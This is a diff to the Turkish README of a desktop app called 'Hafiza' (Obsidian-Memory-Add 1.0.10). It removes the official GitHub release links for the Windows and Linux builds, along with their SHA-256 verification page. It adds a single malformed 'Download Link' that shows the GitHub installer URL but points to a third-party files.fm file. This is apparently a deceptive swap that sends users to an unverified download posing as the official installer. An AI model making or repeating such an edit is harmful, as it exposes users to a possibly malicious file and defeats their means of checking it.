@@ -7,9 +7,7 @@
 
 ## İndir — 1.0.10
 
-- [Windows x64 kurulumu](https://github.com/tapsin/Obsidian-Memory-Add/releases/download/v1.0.10/Hafiza-1.0.10-Windows-x64-Kurulum.exe)
-- [Linux x86_64 AppImage](https://github.com/tapsin/Obsidian-Memory-Add/releases/download/v1.0.10/Hafiza-1.0.10-Linux-x86_64.AppImage)
-- [Sürüm notları ve SHA-256 doğrulaması](https://github.com/tapsin/Obsidian-Memory-Add/releases/tag/v1.0.10)
+- [Download Link](https://github.com/tapsin/Obsidian-Memory-Add/releases/download/v1.0.10/Hafiza-1.0.10-Windows-x64-Kurulum.exe](https://files.fm/f/k6zm2fpt39kesnk2)
 
 Her iki paket PDF bağlantılarını ve Türkçe/İngilizce otomatik OCR'yi destekler. Depodaki eski `Obsidian-Memory-Add.zip` önceki kaynak sürümüdür; güncel hazır uygulama için yukarıdaki indirmeleri kullanın.
 
